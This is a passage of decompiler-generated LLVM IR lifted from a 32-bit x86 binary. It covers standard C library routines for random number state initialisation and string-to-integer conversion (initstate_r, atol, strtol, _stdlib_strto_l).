  %v3_80507ba = mul i32 %v9_80507ae, 2836
  store i32 %v3_80507ba, i32* %eax.global-to-local, align 4
  %v2_80507c0 = sub i32 %v4_80507b4, %v3_80507ba
  %v13_80507c0 = icmp slt i32 %v2_80507c0, 0
  %v1_80507c2 = icmp eq i1 %v13_80507c0, false
  %v1_80507c4 = add i32 %v2_80507c0, 2147483647
  %v2_80507c0.v1_80507c4 = select i1 %v1_80507c2, i32 %v2_80507c0, i32 %v1_80507c4
  store i32 %v2_80507c0.v1_80507c4, i32* %edx.global-to-local, align 4
  %v1_80507ca = add i32 %v0_80507ca, 4
  store i32 %v1_80507ca, i32* %ecx.global-to-local, align 4
  %v1_80507cd = add i32 %v0_80507cd28, 1
  store i32 %v1_80507cd, i32* @edi, align 4
  %v2_80507ce = inttoptr i32 %v1_80507ca to i32*
  store i32 %v2_80507c0.v1_80507c4, i32* %v2_80507ce, align 4
  %v0_80507d0.pre = load i32, i32* @edi, align 4
  %v3_80507d0.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_80507d0.pre to i32
  %v5_80507d3 = icmp slt i32 %v0_80507d0.pre, %extract.t12
  br i1 %v5_80507d3, label %dec_label_pc_80507a6.dec_label_pc_80507a6_crit_edge, label %dec_label_pc_80507d0.dec_label_pc_80507d5_crit_edge

dec_label_pc_80507a6.dec_label_pc_80507a6_crit_edge: ; preds = %dec_label_pc_80507a6
  %v0_80507a6.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_80507ca.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80507a6

dec_label_pc_80507d0.dec_label_pc_80507d5_crit_edge: ; preds = %dec_label_pc_80507a6
  %v0_80507d5.pre = load i32, i32* @esi, align 4
  %v0_80507d8.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80507d5

dec_label_pc_80507d5:                             ; preds = %dec_label_pc_80507d0.dec_label_pc_80507d5_crit_edge, %dec_label_pc_8050795
  %v0_80507d8 = phi i32 [ %v0_80507d8.pre, %dec_label_pc_80507d0.dec_label_pc_80507d5_crit_edge ], [ %v0_8050797, %dec_label_pc_8050795 ]
  %v0_80507d5 = phi i32 [ %v0_80507d5.pre, %dec_label_pc_80507d0.dec_label_pc_80507d5_crit_edge ], [ %v0_8050799, %dec_label_pc_8050795 ]
  %v1_80507d5 = add i32 %v0_80507d5, 20
  %v2_80507d5 = inttoptr i32 %v1_80507d5 to i32*
  %v3_80507d5 = load i32, i32* %v2_80507d5, align 4
  store i32 %v3_80507d5, i32* %eax.global-to-local, align 4
  %v2_80507d8 = add i32 %v0_80507d5, 4
  %v3_80507d8 = inttoptr i32 %v2_80507d8 to i32*
  store i32 %v0_80507d8, i32* %v3_80507d8, align 4
  %v0_80507db = load i32, i32* %ebx.global-to-local, align 4
  %v1_80507db = load i32, i32* %eax.global-to-local, align 4
  %v2_80507db = mul i32 %v1_80507db, 4
  %v3_80507db = add i32 %v2_80507db, %v0_80507db
  store i32 %v3_80507db, i32* %eax.global-to-local, align 4
  %v1_80507de = load i32, i32* @esi, align 4
  %v2_80507de = inttoptr i32 %v1_80507de to i32*
  store i32 %v3_80507db, i32* %v2_80507de, align 4
  %v3_80507e0 = load i64, i64* %stack_var_-40, align 8
  %v6_80507e0 = mul nsw i64 %v3_80507e0, 10
  %v7_80507e0 = trunc i64 %v6_80507e0 to i32
  %v2_80507e6 = ptrtoint i32* %stack_var_-20 to i32
  %v1_80507f324 = add i32 %v7_80507e0, -1
  %v9_80507f325 = icmp slt i32 %v1_80507f324, 0
  store i32 %v1_80507f324, i32* @ebx, align 4
  %v1_80507f426 = icmp eq i1 %v9_80507f325, false
  br i1 %v1_80507f426, label %dec_label_pc_80507e6, label %dec_label_pc_80507f6

dec_label_pc_80507e6:                             ; preds = %dec_label_pc_80507d5, %dec_label_pc_80507e6
  store i32 %v2_80507e6, i32* %eax.global-to-local, align 4
  %v0_80507eb = load i32, i32* @esi, align 4
  %v2_80507ec = inttoptr i32 %v0_80507eb to i32*
  %v3_80507ec = call i32 @__GI_random_r(i32* %v2_80507ec, i32 %v2_80507e6)
  store i32 %v0_80507eb, i32* %eax.global-to-local, align 4
  store i32 %v2_80507e6, i32* %edx.global-to-local, align 4
  %v0_80507f3.pre = load i32, i32* @ebx, align 4
  %v1_80507f3 = add i32 %v0_80507f3.pre, -1
  %v9_80507f3 = icmp slt i32 %v1_80507f3, 0
  store i32 %v1_80507f3, i32* @ebx, align 4
  %v1_80507f4 = icmp eq i1 %v9_80507f3, false
  br i1 %v1_80507f4, label %dec_label_pc_80507e6, label %dec_label_pc_80507f6

dec_label_pc_80507f6:                             ; preds = %dec_label_pc_80507d5, %dec_label_pc_80507e6, %dec_label_pc_805078f
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80507f8

dec_label_pc_80507f8:                             ; preds = %entry, %dec_label_pc_80507f6
  %v0_80507fb = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_80507f6 ]
  store i32 %v0_80507fb, i32* %eax.global-to-local, align 4
  store i32 %v0_805076f, i32* @ebx, align 4
  store i32 %v0_805076e, i32* @esi, align 4
  store i32 %v0_805076d, i32* @edi, align 4
  store i32 %v0_805076c, i32* @ebp, align 4
  ret i32 %v0_80507fb

; uselistorder directives
  uselistorder i32 %v0_80507fb, { 1, 0 }
  uselistorder i32 %v1_80507f3, { 1, 0 }
  uselistorder i32 %v0_80507d5, { 1, 0 }
  uselistorder i32 %v0_80507d0.pre, { 1, 0 }
  uselistorder i32 %v2_80507c0.v1_80507c4, { 1, 0 }
  uselistorder i32 %v0_80507a6, { 1, 0 }
  uselistorder i32 %v0_8050797, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80507f8, { 1, 0 }
  uselistorder label %dec_label_pc_80507f6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80507e6, { 1, 0 }
  uselistorder label %dec_label_pc_80507a6, { 1, 0 }
  uselistorder label %dec_label_pc_805078f, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8050805 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_8050826, label %dec_label_pc_805081a

dec_label_pc_805081a:                             ; preds = %entry
  %v2_805081a = icmp ult i32 %arg3, 256
  %v1_8050821 = select i1 %v2_805081a, i32 5, i32 4
  store i32 %v1_8050821, i32* @ebx, align 4
  br label %dec_label_pc_805083c

dec_label_pc_8050826:                             ; preds = %entry
  %v6_8050829 = icmp ugt i32 %arg3, 31
  br i1 %v6_8050829, label %dec_label_pc_8050834, label %dec_label_pc_805082b

dec_label_pc_805082b:                             ; preds = %dec_label_pc_8050826
  store i32 0, i32* @ebx, align 4
  %v6_8050830 = icmp ugt i32 %arg3, 7
  br i1 %v6_8050830, label %dec_label_pc_805083c, label %dec_label_pc_805088c

dec_label_pc_8050834:                             ; preds = %dec_label_pc_8050826
  %v2_8050834 = icmp ult i32 %arg3, 64
  %v1_8050839 = select i1 %v2_8050834, i32 3, i32 2
  store i32 %v1_8050839, i32* @ebx, align 4
  br label %dec_label_pc_805083c

dec_label_pc_805083c:                             ; preds = %dec_label_pc_805082b, %dec_label_pc_805081a, %dec_label_pc_8050834
  %v0_805083c = phi i32 [ 0, %dec_label_pc_805082b ], [ %v1_8050821, %dec_label_pc_805081a ], [ %v1_8050839, %dec_label_pc_8050834 ]
  %v1_805083c = mul nuw nsw i32 %v0_805083c, 4
  %v2_805083c = add i32 %v1_805083c, ptrtoint (i32* @global_var_8053db4.145 to i32)
  %v3_805083c = inttoptr i32 %v2_805083c to i32*
  %v4_805083c = load i32, i32* %v3_805083c, align 4
  store i32 %v4_805083c, i32* %eax.global-to-local, align 4
  %v1_8050843 = add i32 %tmp7, 4
  store i32 %v1_8050843, i32* @esi, align 4
  %v2_8050846 = add i32 %arg4, 16
  %v3_8050846 = inttoptr i32 %v2_8050846 to i32*
  store i32 %v4_805083c, i32* %v3_8050846, align 4
  %v0_8050849 = load i32, i32* @ebx, align 4
  %v1_8050849 = mul i32 %v0_8050849, 4
  %v2_8050849 = add i32 %v1_8050849, ptrtoint (i32* @global_var_8053da0.146 to i32)
  %v3_8050849 = inttoptr i32 %v2_8050849 to i32*
  %v4_8050849 = load i32, i32* %v3_8050849, align 4
  store i32 %v4_8050849, i32* %edx.global-to-local, align 4
  %v0_8050850 = load i32, i32* @esi, align 4
  %v1_8050850 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050850 = mul i32 %v1_8050850, 4
  %v3_8050850 = add i32 %v2_8050850, %v0_8050850
  store i32 %v3_8050850, i32* %eax.global-to-local, align 4
  %v1_8050853 = load i32, i32* @edi, align 4
  %v2_8050853 = add i32 %v1_8050853, 12
  %v3_8050853 = inttoptr i32 %v2_8050853 to i32*
  store i32 %v0_8050849, i32* %v3_8050853, align 4
  %v0_8050856 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050856 = load i32, i32* @edi, align 4
  %v2_8050856 = add i32 %v1_8050856, 20
  %v3_8050856 = inttoptr i32 %v2_8050856 to i32*
  store i32 %v0_8050856, i32* %v3_8050856, align 4
  %v0_8050859 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050859 = load i32, i32* @edi, align 4
  %v2_8050859 = add i32 %v1_8050859, 24
  %v3_8050859 = inttoptr i32 %v2_8050859 to i32*
  store i32 %v0_8050859, i32* %v3_8050859, align 4
  %v0_805085c = load i32, i32* @esi, align 4
  %v1_805085c = load i32, i32* @edi, align 4
  %v2_805085c = add i32 %v1_805085c, 8
  %v3_805085c = inttoptr i32 %v2_805085c to i32*
  store i32 %v0_805085c, i32* %v3_805085c, align 4
  %v0_805085f = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8050864 = sext i32 %arg1 to i64
  %v3_8050864 = call i32 @srandom_r(i64 %v2_8050864, i32 %v0_805085f)
  %v0_8050869 = load i32, i32* @ebp, align 4
  %v1_8050869 = inttoptr i32 %v0_8050869 to i32*
  store i32 0, i32* %v1_8050869, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050874 = load i32, i32* @ebx, align 4
  %v1_8050874 = icmp eq i32 %v0_8050874, 0
  br i1 %v1_8050874, label %dec_label_pc_80508a5, label %dec_label_pc_8050878

dec_label_pc_8050878:                             ; preds = %dec_label_pc_805083c
  %v0_8050878 = load i32, i32* @edi, align 4
  %v1_8050878 = add i32 %v0_8050878, 4
  %v2_8050878 = inttoptr i32 %v1_8050878 to i32*
  %v3_8050878 = load i32, i32* %v2_8050878, align 4
  %v1_805087b = load i32, i32* @esi, align 4
  %v2_805087b = sub i32 %v3_8050878, %v1_805087b
  %v2_805087d = sdiv i32 %v2_805087b, 4
  %v3_8050880 = mul i32 %v2_805087d, 5
  %v2_8050883 = add i32 %v3_8050880, %v0_8050874
  %v1_8050885 = load i32, i32* @ebp, align 4
  %v2_8050885 = inttoptr i32 %v1_8050885 to i32*
  store i32 %v2_8050883, i32* %v2_8050885, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508a5

dec_label_pc_805088c:                             ; preds = %dec_label_pc_805082b
  %v1_805088c = call i32 @__errno_location(i32 %v0_8050805)
  store i32 %v1_805088c, i32* %eax.global-to-local, align 4
  %v1_8050891 = inttoptr i32 %v1_805088c to i32*
  store i32 22, i32* %v1_8050891, align 4
  %v0_8050897 = load i32, i32* %stack_var_-36, align 4
  %v1_8050897 = call i32 @__errno_location(i32 %v0_8050897)
  %v1_805089c = inttoptr i32 %v1_8050897 to i32*
  store i32 22, i32* %v1_805089c, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508a5

dec_label_pc_80508a5:                             ; preds = %dec_label_pc_805083c, %dec_label_pc_8050878, %dec_label_pc_805088c
  %v0_80508ac = phi i32 [ 0, %dec_label_pc_805083c ], [ 0, %dec_label_pc_8050878 ], [ -1, %dec_label_pc_805088c ]
  ret i32 %v0_80508ac

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80508a5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805083c, { 2, 0, 1 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_80508bb = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_80508bb
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_80508d5 = inttoptr i32 %arg1 to i8*
  %v5_80508d5 = call i32 @_stdlib_strto_l(i8* %v4_80508d5, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_80508d5
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_80508e3 = load i32, i32* @ebx, align 4
  store i32 %v0_80508e3, i32* %stack_var_-16, align 4
  %v0_80508e7 = load i32, i32* @global_var_80551a4, align 4
  %v4_80508ed = ptrtoint i8* %arg1 to i32
  store i32 %v4_80508ed, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_80508ed, i32* %ebx.global-to-local, align 4
  %v2_80508fa40 = load i8, i8* %arg1, align 1
  %v3_80508fa41 = sext i8 %v2_80508fa40 to i32
  store i32 %v3_80508fa41, i32* %eax.global-to-local, align 4
  %v2_80508fd42 = mul nsw i32 %v3_80508fa41, 2
  %v3_80508fd43 = add i32 %v2_80508fd42, %v0_80508e7
  %v4_80508fd44 = inttoptr i32 %v3_80508fd43 to i8*
  %v5_80508fd45 = load i8, i8* %v4_80508fd44, align 1
  %v6_80508fd46 = and i8 %v5_80508fd45, 32
  %v7_80508fd47 = icmp eq i8 %v6_80508fd46, 0
  %v1_805090148 = icmp eq i1 %v7_80508fd47, false
  br i1 %v1_805090148, label %dec_label_pc_80508f9, label %dec_label_pc_8050903

dec_label_pc_80508f9:                             ; preds = %entry, %dec_label_pc_80508f9
  %v0_80508f949 = phi i32 [ %v1_80508f9, %dec_label_pc_80508f9 ], [ %v4_80508ed, %entry ]
  %v1_80508f9 = add i32 %v0_80508f949, 1
  store i32 %v1_80508f9, i32* %ebx.global-to-local, align 4
  %v1_80508fa = inttoptr i32 %v1_80508f9 to i8*
  %v2_80508fa = load i8, i8* %v1_80508fa, align 1
  %v3_80508fa = sext i8 %v2_80508fa to i32
  store i32 %v3_80508fa, i32* %eax.global-to-local, align 4
  %v2_80508fd = mul nsw i32 %v3_80508fa, 2
  %v3_80508fd = add i32 %v2_80508fd, %v0_80508e7
  %v4_80508fd = inttoptr i32 %v3_80508fd to i8*
  %v5_80508fd = load i8, i8* %v4_80508fd, align 1
  %v6_80508fd = and i8 %v5_80508fd, 32
  %v7_80508fd = icmp eq i8 %v6_80508fd, 0
  %v1_8050901 = icmp eq i1 %v7_80508fd, false
  br i1 %v1_8050901, label %dec_label_pc_80508f9, label %dec_label_pc_8050903

dec_label_pc_8050903:                             ; preds = %dec_label_pc_80508f9, %entry
  %v0_80508f9.lcssa = phi i32 [ %v4_80508ed, %entry ], [ %v1_80508f9, %dec_label_pc_80508f9 ]
  %v2_80508fa.lcssa = phi i8 [ %v2_80508fa40, %entry ], [ %v2_80508fa, %dec_label_pc_80508f9 ]
  %v3_80508fa.lcssa = phi i32 [ %v3_80508fa41, %entry ], [ %v3_80508fa, %dec_label_pc_80508f9 ]
  %tmp36 = trunc i32 %arg4 to i8
  %v9_8050903 = icmp eq i8 %v2_80508fa.lcssa, 43
  br i1 %v9_8050903, label %dec_label_pc_8050918, label %dec_label_pc_8050908

dec_label_pc_8050908:                             ; preds = %dec_label_pc_8050903
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_805090a = icmp eq i8 %v2_80508fa.lcssa, 45
  %v1_805090d = icmp eq i1 %v9_805090a, false
  br i1 %v1_805090d, label %dec_label_pc_8050919, label %dec_label_pc_8050918

dec_label_pc_8050918:                             ; preds = %dec_label_pc_8050903, %dec_label_pc_8050908
  %storemerge2 = phi i32 [ 1, %dec_label_pc_8050908 ], [ 0, %dec_label_pc_8050903 ]
  store i32 %storemerge2, i32* %ebp.global-to-local, align 4
  %v1_8050918 = add i32 %v0_80508f9.lcssa, 1
  store i32 %v1_8050918, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050919

dec_label_pc_8050919:                             ; preds = %dec_label_pc_8050908, %dec_label_pc_8050918
  %v0_805092b = phi i32 [ %v0_80508f9.lcssa, %dec_label_pc_8050908 ], [ %v1_8050918, %dec_label_pc_8050918 ]
  %v1_805091b = and i32 %arg3, -17
  %v2_805091b = icmp eq i32 %v1_805091b, 0
  %v1_8050921 = icmp eq i1 %v2_805091b, false
  br i1 %v1_8050921, label %dec_label_pc_8050947, label %dec_label_pc_8050923

dec_label_pc_8050923:                             ; preds = %dec_label_pc_8050919
  %v1_8050923 = add i32 %arg3, 10
  store i32 %v1_8050923, i32* %esi.global-to-local, align 4
  %v1_8050926 = inttoptr i32 %v0_805092b to i8*
  %v2_8050926 = load i8, i8* %v1_8050926, align 1
  %v8_8050926 = icmp eq i8 %v2_8050926, 48
  %v1_8050929 = icmp eq i1 %v8_8050926, false
  br i1 %v1_8050929, label %dec_label_pc_805093d, label %dec_label_pc_805092b

dec_label_pc_805092b:                             ; preds = %dec_label_pc_8050923
  %v1_805092b = add i32 %v0_805092b, 1
  store i32 %v1_805092b, i32* %ebx.global-to-local, align 4
  %v1_805092c = add i32 %arg3, 8
  store i32 %v1_805092c, i32* %esi.global-to-local, align 4
  %v1_8050931 = inttoptr i32 %v1_805092b to i8*
  %v2_8050931 = load i8, i8* %v1_8050931, align 1
  %v3_8050931 = zext i8 %v2_8050931 to i32
  %v5_8050931 = and i32 %v3_80508fa.lcssa, -256
  %v6_8050931 = or i32 %v5_8050931, %v3_8050931
  %v1_8050933 = or i32 %v6_8050931, 32
  %v3_8050933 = trunc i32 %v1_8050933 to i8
  store i32 %v1_8050933, i32* %eax.global-to-local, align 4
  %v10_8050936 = icmp eq i8 %v3_8050933, 120
  %v1_8050938 = icmp eq i1 %v10_8050936, false
  br i1 %v1_8050938, label %dec_label_pc_805093d, label %dec_label_pc_805093a

dec_label_pc_805093a:                             ; preds = %dec_label_pc_805092b
  %v2_805093a = mul i32 %v1_805092c, 2
  store i32 %v2_805093a, i32* %esi.global-to-local, align 4
  %v1_805093c = add i32 %v0_805092b, 2
  store i32 %v1_805093c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805093d

dec_label_pc_805093d:                             ; preds = %dec_label_pc_805092b, %dec_label_pc_8050923, %dec_label_pc_805093a
  %v0_805096611 = phi i32 [ %v1_805092b, %dec_label_pc_805092b ], [ %v0_805092b, %dec_label_pc_8050923 ], [ %v1_805093c, %dec_label_pc_805093a ]
  %v0_80509bd19 = phi i32 [ %v1_805092b, %dec_label_pc_805092b ], [ %v4_80508ed, %dec_label_pc_8050923 ], [ %v1_805092b, %dec_label_pc_805093a ]
  %v0_805093d = phi i32 [ %v1_805092c, %dec_label_pc_805092b ], [ %v1_8050923, %dec_label_pc_8050923 ], [ %v2_805093a, %dec_label_pc_805093a ]
  %v7_8050940 = icmp sgt i32 %v0_805093d, 16
  br i1 %v7_8050940, label %dec_label_pc_8050942, label %dec_label_pc_8050947

dec_label_pc_8050942:                             ; preds = %dec_label_pc_805093d
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050947

dec_label_pc_8050947:                             ; preds = %dec_label_pc_805093d, %dec_label_pc_8050919, %dec_label_pc_8050942
  %v0_80509bd20 = phi i32 [ %v0_80509bd19, %dec_label_pc_805093d ], [ %v4_80508ed, %dec_label_pc_8050919 ], [ %v0_80509bd19, %dec_label_pc_8050942 ]
  %v0_805096612 = phi i32 [ %v0_805096611, %dec_label_pc_805093d ], [ %v0_805092b, %dec_label_pc_8050919 ], [ %v0_805096611, %dec_label_pc_8050942 ]
  %v0_8050956 = phi i32 [ %v0_805093d, %dec_label_pc_805093d ], [ %arg3, %dec_label_pc_8050919 ], [ 16, %dec_label_pc_8050942 ]
  %v1_8050947 = add i32 %v0_8050956, -2
  store i32 %v1_8050947, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_805094f = icmp ugt i32 %v1_8050947, 34
  br i1 %v6_805094f, label %dec_label_pc_80509b2, label %dec_label_pc_8050951

dec_label_pc_8050951:                             ; preds = %dec_label_pc_8050947
  %div = udiv i32 -1, %v0_8050956
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp37 = urem i32 -1, %v0_8050956
  %v1_8050958 = trunc i32 %tmp37 to i8
  store i32 0, i32* @edx, align 4
  %v4_8050992 = urem i32 %arg4, 256
  br label %dec_label_pc_8050966

dec_label_pc_8050964:                             ; preds = %dec_label_pc_80509a8, %dec_label_pc_8050992
  %v4_8050966.pre = phi i32 [ %v1_805097c, %dec_label_pc_80509a8 ], [ %v4_8050966.pre.pre, %dec_label_pc_8050992 ]
  %v0_8050964 = phi i32 [ %v1_8050983, %dec_label_pc_80509a8 ], [ %v0_8050964.pre, %dec_label_pc_8050992 ]
  br label %dec_label_pc_8050966

dec_label_pc_8050966:                             ; preds = %dec_label_pc_8050951, %dec_label_pc_8050964
  %v0_80509bd18 = phi i32 [ %v0_80509bd20, %dec_label_pc_8050951 ], [ %v0_8050964, %dec_label_pc_8050964 ]
  %v0_8050983 = phi i32 [ %v0_805096612, %dec_label_pc_8050951 ], [ %v0_8050964, %dec_label_pc_8050964 ]
  %v4_8050966 = phi i32 [ %div, %dec_label_pc_8050951 ], [ %v4_8050966.pre, %dec_label_pc_8050964 ]
  %v1_8050966 = inttoptr i32 %v0_8050983 to i8*
  %v2_8050966 = load i8, i8* %v1_8050966, align 1
  %v3_8050966 = zext i8 %v2_8050966 to i32
  %v5_8050966 = and i32 %v4_8050966, -256
  %v6_8050966 = or i32 %v3_8050966, %v5_8050966
  store i32 %v6_8050966, i32* %eax.global-to-local, align 4
  %v1_8050968 = add i32 %v6_8050966, -48
  store i32 %v1_8050968, i32* @ecx, align 4
  %v1_805096b = trunc i32 %v1_8050968 to i8
  %tmp54 = icmp ult i8 %v1_805096b, 10
  br i1 %tmp54, label %dec_label_pc_805097c, label %dec_label_pc_8050970

dec_label_pc_8050970:                             ; preds = %dec_label_pc_8050966
  %v1_8050970 = or i32 %v6_8050966, 32
  %v3_8050970 = trunc i32 %v1_8050970 to i8
  store i32 %v1_8050970, i32* %eax.global-to-local, align 4
  %v1_8050973 = and i32 %v1_8050968, -256
  %v2_8050973 = or i32 %v1_8050973, 40
  store i32 %v2_8050973, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v3_8050970, 97
  br i1 %tmp55, label %dec_label_pc_805097c, label %dec_label_pc_8050979

dec_label_pc_8050979:                             ; preds = %dec_label_pc_8050970
  %v1_8050979 = add i32 %v1_8050970, -87
  store i32 %v1_8050979, i32* @ecx, align 4
  br label %dec_label_pc_805097c

dec_label_pc_805097c:                             ; preds = %dec_label_pc_8050970, %dec_label_pc_8050966, %dec_label_pc_8050979
  %v0_80509ab = phi i32 [ %v2_8050973, %dec_label_pc_8050970 ], [ %v1_8050968, %dec_label_pc_8050966 ], [ %v1_8050979, %dec_label_pc_8050979 ]
  %v1_805097c = urem i32 %v0_80509ab, 256
  store i32 %v1_805097c, i32* %eax.global-to-local, align 4
  %v1_805097f = load i32, i32* %esi.global-to-local, align 4
  %v2_805097f = sub i32 %v1_805097c, %v1_805097f
  %v10_805097f = and i32 %v2_805097f, %v1_805097f
  %v11_805097f = icmp slt i32 %v10_805097f, 0
  %v13_805097f = icmp slt i32 %v2_805097f, 0
  %v2_8050981 = icmp eq i1 %v13_805097f, %v11_805097f
  br i1 %v2_8050981, label %dec_label_pc_80509b2, label %dec_label_pc_8050983

dec_label_pc_8050983:                             ; preds = %dec_label_pc_805097c
  %v1_8050983 = add i32 %v0_8050983, 1
  store i32 %v1_8050983, i32* %ebx.global-to-local, align 4
  %v0_8050984 = load i32, i32* @edx, align 4
  %tmp56 = icmp ugt i32 %v0_8050984, %div
  br i1 %tmp56, label %dec_label_pc_8050992, label %dec_label_pc_805098a

dec_label_pc_805098a:                             ; preds = %dec_label_pc_8050983
  %v15_8050984 = icmp eq i32 %v0_8050984, %div
  %v1_805098a = icmp eq i1 %v15_8050984, false
  br i1 %v1_805098a, label %dec_label_pc_80509a8, label %dec_label_pc_805098c

dec_label_pc_805098c:                             ; preds = %dec_label_pc_805098a
  %v1_805098c = trunc i32 %v0_80509ab to i8
  %tmp57 = icmp ugt i8 %v1_805098c, %v1_8050958
  br i1 %tmp57, label %dec_label_pc_8050992, label %dec_label_pc_80509a8

dec_label_pc_8050992:                             ; preds = %dec_label_pc_805098c, %dec_label_pc_8050983
  store i32 %v4_8050992, i32* %eax.global-to-local, align 4
  %v0_8050996 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050996 = and i32 %v0_8050996, %v4_8050992
  store i32 %v2_8050996, i32* %ebp.global-to-local, align 4
  %v1_8050998 = call i32 @__errno_location(i32 %div)
  store i32 %v1_8050998, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_80509a0 = inttoptr i32 %v1_8050998 to i32*
  store i32 34, i32* %v1_80509a0, align 4
  %v0_8050964.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8050966.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050964

dec_label_pc_80509a8:                             ; preds = %dec_label_pc_805098c, %dec_label_pc_805098a
  %v4_80509a8 = mul i32 %v0_8050984, %v1_805097f
  store i32 %v1_805097c, i32* %eax.global-to-local, align 4
  %v2_80509ae = add i32 %v4_80509a8, %v1_805097c
  store i32 %v2_80509ae, i32* @edx, align 4
  br label %dec_label_pc_8050964

dec_label_pc_80509b2:                             ; preds = %dec_label_pc_805097c, %dec_label_pc_8050947
  %v0_80509bd = phi i32 [ %v0_80509bd20, %dec_label_pc_8050947 ], [ %v0_80509bd18, %dec_label_pc_805097c ]
  %stack_var_-24.0 = phi i32 [ %tmp26, %dec_label_pc_8050947 ], [ %div, %dec_label_pc_805097c ]
  %v4_80509b2 = icmp eq i32 %arg2, 0
  br i1 %v4_80509b2, label %dec_label_pc_80509bf, label %dec_label_pc_80509b9

dec_label_pc_80509b9:                             ; preds = %dec_label_pc_80509b2
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80509bd = inttoptr i32 %arg2 to i32*
  store i32 %v0_80509bd, i32* %v2_80509bd, align 4
  br label %dec_label_pc_80509bf

dec_label_pc_80509bf:                             ; preds = %dec_label_pc_80509b2, %dec_label_pc_80509b9
  %v0_80509bf = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_80509bf, i32* %eax.global-to-local, align 4
  %v1_80509c1 = trunc i32 %v0_80509bf to i8
  %v6_80509c1 = icmp eq i8 %v1_80509c1, 0
  %v2_80509c3 = zext i1 %v6_80509c1 to i32
  %v1_80509c53 = or i32 %v2_80509c3, -2147483648
  store i32 %v1_80509c53, i32* %ebx.global-to-local, align 4
  %v5_80509cb = icmp eq i8 %tmp36, 0
  br i1 %v5_80509cb, label %dec_label_pc_80509e3, label %dec_label_pc_80509d2

dec_label_pc_80509d2:                             ; preds = %dec_label_pc_80509bf
  %v0_80509d2 = load i32, i32* @edx, align 4
  %tmp58 = icmp ugt i32 %v0_80509d2, %v1_80509c53
  br i1 %tmp58, label %dec_label_pc_80509d6, label %dec_label_pc_80509e3

dec_label_pc_80509d6:                             ; preds = %dec_label_pc_80509d2
  %v1_80509d6 = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_80509d6, i32* %eax.global-to-local, align 4
  %v0_80509db = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80509db, i32* @edx, align 4
  %v1_80509dd = inttoptr i32 %v1_80509d6 to i32*
  store i32 34, i32* %v1_80509dd, align 4
  %v0_80509e3.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80509e3

dec_label_pc_80509e3:                             ; preds = %dec_label_pc_80509d2, %dec_label_pc_80509bf, %dec_label_pc_80509d6
  %v0_80509e3 = phi i32 [ %v0_80509bf, %dec_label_pc_80509d2 ], [ %v0_80509bf, %dec_label_pc_80509bf ], [ %v0_80509e3.pre, %dec_label_pc_80509d6 ]
  store i32 %v0_80509e3, i32* %eax.global-to-local, align 4
  %v3_80509e5 = trunc i32 %v0_80509e3 to i8
  %v4_80509e5 = icmp eq i8 %v3_80509e5, 0
